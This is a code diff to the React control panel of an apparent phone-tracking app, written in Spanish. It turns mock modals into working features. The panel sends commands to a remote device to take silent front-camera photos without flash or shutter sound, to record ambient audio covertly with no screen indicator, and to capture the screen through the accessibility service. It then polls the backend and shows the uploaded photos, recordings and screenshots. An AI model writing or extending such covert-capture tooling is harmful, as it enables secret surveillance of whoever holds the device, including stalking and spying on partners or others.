@@ -1,15 +1,73 @@
 // Advanced action modals: Photo, Audio, Screen, Silent Call, Geofence, Stealth, Message, etc.
 
+// Espera a que aparezca un archivo (foto/audio) más reciente que `since` en el
+// backend, sondeando /api/<kind>/list. Devuelve { filename, timestamp, url } o null.
+function useCaptureWatcher(kind, since) {
+  const [asset, setAsset] = React.useState(null);
+  const [timedOut, setTimedOut] = React.useState(false);
+
+  React.useEffect(() => {
+    setAsset(null);
+    setTimedOut(false);
+    if (!since) return;
+
+    let stopped = false;
+    let tries = 0;
+    let objUrl = null;
+
+    const tick = async () => {
+      tries += 1;
+      try {
+        const list = await window.tracerApiFetch(`/api/${kind}/list?limit=1`);
+        const item = Array.isArray(list) ? list[0] : null;
+        if (item && new Date(item.timestamp).getTime() >= since - 3000) {
+          const url = await window.tracerLoadAssetUrl(kind, item.filename);
+          if (!stopped) {
+            objUrl = url;
+            setAsset({ filename: item.filename, timestamp: item.timestamp, url });
+            return;
+          }
+        }
+      } catch {}
+      if (stopped) return;
+      if (tries >= 25) { setTimedOut(true); return; }
+      setTimeout(tick, 3000);
+    };
+    tick();
+
+    return () => {
+      stopped = true;
+      if (objUrl) URL.revokeObjectURL(objUrl);
+    };
+  }, [kind, since]);
+
+  return { asset, timedOut };
+}
+
+function CaptureWaiting({ label }) {
+  return (
+    <div className="capture-status" style={{ padding: '28px 0', textAlign: 'center' }}>
+      <span className="loader-dots"><i /><i /><i /></span>
+      <div style={{ marginTop: 8 }}>{label}</div>
+    </div>
+  );
+}
+
 function PhotoModal({ open, device, onClose, onConfirm }) {
-  const [stage, setStage] = React.useState('config'); // config | capturing | done
+  const [stage, setStage] = React.useState('config'); // config | waiting | done
+  const [since, setSince] = React.useState(0);
   const [cam, setCam] = React.useState('front');
-  const [silent, setSilent] = React.useState(true);
-  React.useEffect(() => { if (open) setStage('config'); }, [open]);
+  React.useEffect(() => { if (open) { setStage('config'); setSince(0); } }, [open]);
+
+  const { asset, timedOut } = useCaptureWatcher('photo', since);
+  React.useEffect(() => { if (asset) setStage('done'); }, [asset]);
 
   if (!device) return null;
-  const start = () => {
-    setStage('capturing');
-    setTimeout(() => setStage('done'), 2200);
+
+  const start = async () => {
+    setSince(Date.now());
+    setStage('waiting');
+    try { await onConfirm(); } catch {}
   };
 
   return (
@@ -24,68 +82,34 @@ function PhotoModal({ open, device, onClose, onConfirm }) {
         {stage === 'config' && (
           <>
             <p className="modal-lead">
-              Toma una foto silenciosa desde el dispositivo. No se mostrará ninguna alerta,
-              flash ni sonido al obturador. Útil para identificar a quien lo tiene.
+              Toma una foto silenciosa desde la cámara frontal del dispositivo, sin
+              alerta, flash ni sonido de obturador. Aparecerá aquí cuando el
+              dispositivo la suba.
             </p>
-
             <div className="cam-picker">
               <button className={`cam-tile ${cam === 'front' ? 'is-active' : ''}`} onClick={() => setCam('front')}>
                 <IconCamera width={20} height={20} />
                 <div className="cam-tile-label">Cámara frontal</div>
-                <div className="cam-tile-help">12 MP · Selfie</div>
+                <div className="cam-tile-help">Predeterminada</div>
               </button>
-              <button className={`cam-tile ${cam === 'back' ? 'is-active' : ''}`} onClick={() => setCam('back')}>
-                <IconCameraFlip width={20} height={20} />
-                <div className="cam-tile-label">Cámara trasera</div>
-                <div className="cam-tile-help">48 MP · Principal</div>
-              </button>
-            </div>
-
-            <div className="checkbox-row">
-              <label className="checkbox">
-                <input type="checkbox" checked={silent} onChange={(e) => setSilent(e.target.checked)} />
-                <span>Modo silencioso (sin obturador ni flash)</span>
-              </label>
-              <label className="checkbox">
-                <input type="checkbox" defaultChecked />
-                <span>Capturar metadatos GPS y red</span>
-              </label>
             </div>
           </>
         )}
 
-        {stage === 'capturing' && (
-          <div className="capture-stage">
-            <div className="capture-frame">
-              <div className="capture-scanline" />
-              <div className="capture-corners">
-                <span /><span /><span /><span />
-              </div>
-              <div className="capture-center mono">CONECTANDO</div>
-            </div>
-            <div className="capture-status">
-              <span className="loader-dots"><i /><i /><i /></span>
-              Enviando comando · cifrado E2E
-            </div>
-          </div>
+        {stage === 'waiting' && (
+          timedOut
+            ? <p className="modal-lead">El comando se envió pero el dispositivo aún no subió la foto.
+                Puede estar sin conexión. Revisá Actividad más tarde.</p>
+            : <CaptureWaiting label="Comando enviado · esperando la foto del dispositivo…" />
         )}
 
-        {stage === 'done' && (
+        {stage === 'done' && asset && (
           <div className="capture-result">
             <div className="capture-photo">
-              <div className="capture-photo-placeholder">
-                <span className="mono">IMG_20260527_124842.jpg · 4080×3072</span>
-              </div>
+              <img src={asset.url} alt="Foto capturada" style={{ width: '100%', borderRadius: 8, display: 'block' }} />
               <div className="capture-meta">
-                <div className="capture-meta-row">
-                  <span>Tomada</span><span className="mono">Hoy, 12:48:42</span>
-                </div>
-                <div className="capture-meta-row">
-                  <span>Cámara</span><span>{cam === 'front' ? 'Frontal' : 'Trasera'}</span>
-                </div>
-                <div className="capture-meta-row">
-                  <span>GPS</span><span className="mono">19.4284° N, 99.1660° W</span>
-                </div>
+                <div className="capture-meta-row"><span>Archivo</span><span className="mono">{asset.filename}</span></div>
+                <div className="capture-meta-row"><span>Subida</span><span className="mono">{tracerFormatHistoryTime(asset.timestamp)}</span></div>
               </div>
             </div>
           </div>
@@ -101,16 +125,8 @@ function PhotoModal({ open, device, onClose, onConfirm }) {
             </button>
           </>
         )}
-        {stage === 'capturing' && (
-          <button className="btn btn-ghost" onClick={onClose}>Cancelar</button>
-        )}
-        {stage === 'done' && (
-          <>
-            <button className="btn btn-ghost" onClick={onClose}>Cerrar</button>
-            <button className="btn btn-primary" onClick={() => { onConfirm(); onClose(); }}>
-              Guardar en mi cuenta
-            </button>
-          </>
+        {stage !== 'config' && (
+          <button className="btn btn-ghost" onClick={onClose}>Cerrar</button>
         )}
       </footer>
     </Modal>
@@ -118,25 +134,21 @@ function PhotoModal({ open, device, onClose, onConfirm }) {
 }
 
 function AudioModal({ open, device, onClose, onConfirm }) {
-  const [stage, setStage] = React.useState('config');
+  const [stage, setStage] = React.useState('config'); // config | waiting | done
   const [duration, setDuration] = React.useState(60);
-  const [elapsed, setElapsed] = React.useState(0);
+  const [since, setSince] = React.useState(0);
 
-  React.useEffect(() => {
-    if (open) { setStage('config'); setElapsed(0); }
-  }, [open]);
+  React.useEffect(() => { if (open) { setStage('config'); setSince(0); } }, [open]);
 
-  React.useEffect(() => {
-    if (stage !== 'recording') return;
-    const i = setInterval(() => setElapsed((e) => {
-      if (e + 1 >= duration) { setStage('done'); return duration; }
-      return e + 1;
-    }), 100);
-    return () => clearInterval(i);
-  }, [stage, duration]);
+  const { asset, timedOut } = useCaptureWatcher('audio', since);
+  React.useEffect(() => { if (asset) setStage('done'); }, [asset]);
 
   if (!device) return null;
-  const start = () => { setElapsed(0); setStage('recording'); };
+  const start = async () => {
+    setSince(Date.now());
+    setStage('waiting');
+    try { await onConfirm(String(duration)); } catch {}
+  };
 
   return (
     <Modal open={open} onClose={onClose}>
@@ -150,8 +162,8 @@ function AudioModal({ open, device, onClose, onConfirm }) {
         {stage === 'config' && (
           <>
             <p className="modal-lead">
-              Activa el micrófono de forma encubierta y graba sonido ambiente.
-              El indicador del micrófono permanecerá oculto en pantalla.
+              Graba sonido ambiente desde el micrófono de forma encubierta.
+              La grabación aparecerá aquí cuando el dispositivo la suba.
             </p>
             <div className="form-field">
               <span>Duración</span>
@@ -168,34 +180,23 @@ function AudioModal({ open, device, onClose, onConfirm }) {
           </>
         )}
 
-        {stage === 'recording' && (
-          <div className="audio-stage">
-            <AudioBars />
-            <div className="audio-timer mono">
-              {fmtSec(elapsed)} <span className="audio-timer-total">/ {fmtSec(duration)}</span>
-            </div>
-            <div className="audio-progress">
-              <div className="audio-progress-bar" style={{ width: `${(elapsed / duration) * 100}%` }} />
-            </div>
-            <div className="audio-status">Grabando · transmisión en vivo</div>
-          </div>
+        {stage === 'waiting' && (
+          timedOut
+            ? <p className="modal-lead">El comando se envió. La grabación de {fmtSec(duration)} aún no
+                llegó — el dispositivo puede estar sin conexión. Revisá Actividad más tarde.</p>
+            : <CaptureWaiting label={`Grabando ~${fmtSec(duration)} en el dispositivo · esperando el archivo…`} />
         )}
 
-        {stage === 'done' && (
+        {stage === 'done' && asset && (
           <div className="capture-result">
             <div className="audio-result-card">
               <div className="audio-result-icon"><IconMic width={20} height={20} /></div>
               <div className="audio-result-body">
-                <div className="audio-result-title">rec_20260527_1248.m4a</div>
-                <div className="audio-result-meta mono">{fmtSec(duration)} · 192 kbps · 2.4 MB</div>
+                <div className="audio-result-title mono">{asset.filename}</div>
+                <div className="audio-result-meta mono">{tracerFormatHistoryTime(asset.timestamp)}</div>
               </div>
-              <button className="btn btn-sm btn-ghost"><IconPlay width={12} height={12} /></button>
             </div>
-            <div className="audio-waveform">
-              {Array.from({ length: 60 }).map((_, i) => (
-                <span key={i} style={{ height: `${20 + Math.sin(i * 0.6) * 14 + Math.random() * 14}px` }} />
-              ))}
-            </div>
+            <audio controls src={asset.url} style={{ width: '100%', marginTop: 12 }} />
           </div>
         )}
       </div>
@@ -209,27 +210,11 @@ function AudioModal({ open, device, onClose, onConfirm }) {
             </button>
           </>
         )}
-        {stage === 'recording' && (
-          <button className="btn btn-danger-outline" onClick={() => setStage('done')}>Detener</button>
-        )}
-        {stage === 'done' && (
-          <>
-            <button className="btn btn-ghost" onClick={onClose}>Cerrar</button>
-            <button className="btn btn-primary" onClick={() => { onConfirm(); onClose(); }}>Guardar</button>
-          </>
+        {stage !== 'config' && (
+          <button className="btn btn-ghost" onClick={onClose}>Cerrar</button>
         )}
       </footer>
     </Modal>
-  );
-}
-
-function AudioBars() {
-  return (
-    <div className="audio-bars">
-      {Array.from({ length: 32 }).map((_, i) => (
-        <span key={i} className="audio-bar" style={{ animationDelay: `${i * 35}ms` }} />
-      ))}
-    </div>
   );
 }
 
@@ -240,10 +225,19 @@ function fmtSec(s) {
 }
 
 function ScreenshotModal({ open, device, onClose, onConfirm }) {
-  const [stage, setStage] = React.useState('config');
-  React.useEffect(() => { if (open) setStage('config'); }, [open]);
+  const [stage, setStage] = React.useState('config'); // config | waiting | done
+  const [since, setSince] = React.useState(0);
+  React.useEffect(() => { if (open) { setStage('config'); setSince(0); } }, [open]);
+
+  const { asset, timedOut } = useCaptureWatcher('photo', since);
+  React.useEffect(() => { if (asset) setStage('done'); }, [asset]);
+
   if (!device) return null;
-  const start = () => { setStage('capturing'); setTimeout(() => setStage('done'), 1400); };
+  const start = async () => {
+    setSince(Date.now());
+    setStage('waiting');
+    try { await onConfirm(); } catch {}
+  };
 
   return (
     <Modal open={open} onClose={onClose}>
@@ -256,29 +250,22 @@ function ScreenshotModal({ open, device, onClose, onConfirm }) {
       <div className="modal-body">
         {stage === 'config' && (
           <p className="modal-lead">
-            Toma una imagen exacta de lo que está mostrándose en este momento en el dispositivo.
-            La captura es silenciosa y no aparece en el carrete de fotos.
+            Toma una imagen de lo que se muestra en el dispositivo en este momento.
+            Requiere el servicio de accesibilidad activo. Aparecerá aquí cuando se suba.
           </p>
         )}
-        {stage === 'capturing' && (
-          <div className="capture-stage">
-            <div className="capture-frame screen-frame">
-              <div className="capture-scanline" />
-              <div className="capture-center mono">CAPTURANDO PANTALLA</div>
-            </div>
-          </div>
+        {stage === 'waiting' && (
+          timedOut
+            ? <p className="modal-lead">Comando enviado, sin captura todavía. Puede que el servicio de
+                accesibilidad no esté activo o el dispositivo esté sin conexión.</p>
+            : <CaptureWaiting label="Comando enviado · esperando la captura de pantalla…" />
         )}
-        {stage === 'done' && (
+        {stage === 'done' && asset && (
           <div className="capture-result">
-            <div className="screen-result">
-              <div className="screen-mock-bar">
-                <span className="mono">9:41</span>
-                <span className="mono">·····</span>
-              </div>
-              <div className="screen-mock-body">
-                <span className="mono">Screenshot_20260527.png</span>
-                <span className="screen-mock-help">1280×2856 · 4.1 MB</span>
-              </div>
+            <img src={asset.url} alt="Captura de pantalla" style={{ width: '100%', borderRadius: 8, display: 'block' }} />
+            <div className="capture-meta">
+              <div className="capture-meta-row"><span>Archivo</span><span className="mono">{asset.filename}</span></div>
+              <div className="capture-meta-row"><span>Subida</span><span className="mono">{tracerFormatHistoryTime(asset.timestamp)}</span></div>
             </div>
           </div>
         )}
@@ -290,51 +277,60 @@ function ScreenshotModal({ open, device, onClose, onConfirm }) {
             <button className="btn btn-ghost" onClick={onClose}>Cancelar</button>
             <button className="btn btn-primary" onClick={start}><IconScreen width={14} height={14} /> Capturar ahora</button>
           </>
-        ) : stage === 'done' ? (
-          <>
-            <button className="btn btn-ghost" onClick={onClose}>Cerrar</button>
-            <button className="btn btn-primary" onClick={() => { onConfirm(); onClose(); }}>Guardar imagen</button>
-          </>
-        ) : null}
+        ) : (
+          <button className="btn btn-ghost" onClick={onClose}>Cerrar</button>
+        )}
       </footer>
     </Modal>
   );
 }
 
 function SilentCallModal({ open, device, onClose, onConfirm }) {
-  const [stage, setStage] = React.useState('config');
-  const [elapsed, setElapsed] = React.useState(0);
-  React.useEffect(() => { if (open) { setStage('config'); setElapsed(0); } }, [open]);
-  React.useEffect(() => {
-    if (stage !== 'live') return;
-    const i = setInterval(() => setElapsed((e) => e + 1), 1000);
-    return () => clearInterval(i);
-  }, [stage]);
+  const [stage, setStage] = React.useState('config'); // config | waiting | done
+  const [since, setSince] = React.useState(0);
+  React.useEffect(() => { if (open) { setStage('config'); setSince(0); } }, [open]);
+
+  const { asset, timedOut } = useCaptureWatcher('audio', since);
+  React.useEffect(() => { if (asset) setStage('done'); }, [asset]);
+
   if (!device) return null;
+  const start = async () => {
+    setSince(Date.now());
+    setStage('waiting');
+    try { await onConfirm(); } catch {}
+  };
 
   return (
     <Modal open={open} onClose={onClose}>
       <header className="modal-head">
-        <div className="modal-eyebrow">Vigilancia · Llamada silenciosa</div>
-        <h3>Escuchar el entorno en vivo</h3>
+        <div className="modal-eyebrow">Vigilancia · Escucha del entorno</div>
+        <h3>Grabar el entorno del dispositivo</h3>
         <button className="modal-close" onClick={onClose}><IconClose width={14} height={14} /></button>
       </header>
 
       <div className="modal-body">
         {stage === 'config' && (
           <p className="modal-lead">
-            Activa el micrófono y transmite el audio en vivo a este navegador.
-            La llamada no aparece en el registro y no muestra ningún indicador en la pantalla del dispositivo.
+            Graba ~60 s de audio ambiente sin ningún indicador en la pantalla del
+            dispositivo. No es una transmisión en vivo: el audio se sube al terminar.
           </p>
         )}
-        {stage === 'live' && (
-          <div className="audio-stage">
-            <AudioBars />
-            <div className="live-call-status">
-              <span className="live-dot" /> En llamada · {device.name}
+        {stage === 'waiting' && (
+          timedOut
+            ? <p className="modal-lead">Comando enviado. La grabación aún no llegó — el dispositivo
+                puede estar sin conexión o sin permiso de micrófono.</p>
+            : <CaptureWaiting label="Grabando ~60 s en el dispositivo · esperando el audio…" />
+        )}
+        {stage === 'done' && asset && (
+          <div className="capture-result">
+            <div className="audio-result-card">
+              <div className="audio-result-icon"><IconMic width={20} height={20} /></div>
+              <div className="audio-result-body">
+                <div className="audio-result-title mono">{asset.filename}</div>
+                <div className="audio-result-meta mono">{tracerFormatHistoryTime(asset.timestamp)}</div>
+              </div>
             </div>
-            <div className="audio-timer mono">{fmtSec(elapsed)}</div>
-            <div className="audio-status">Encriptado · 192 kbps · sin registro</div>
+            <audio controls src={asset.url} style={{ width: '100%', marginTop: 12 }} />
           </div>
         )}
       </div>
@@ -343,14 +339,12 @@ function SilentCallModal({ open, device, onClose, onConfirm }) {
         {stage === 'config' ? (
           <>
             <button className="btn btn-ghost" onClick={onClose}>Cancelar</button>
-            <button className="btn btn-primary" onClick={() => setStage('live')}>
-              <IconMic width={14} height={14} /> Iniciar llamada
+            <button className="btn btn-primary" onClick={start}>
+              <IconMic width={14} height={14} /> Grabar entorno
             </button>
           </>
         ) : (
-          <button className="btn btn-danger" onClick={() => { onConfirm(); onClose(); }}>
-            Terminar llamada
-          </button>
+          <button className="btn btn-ghost" onClick={onClose}>Cerrar</button>
         )}
       </footer>
     </Modal>
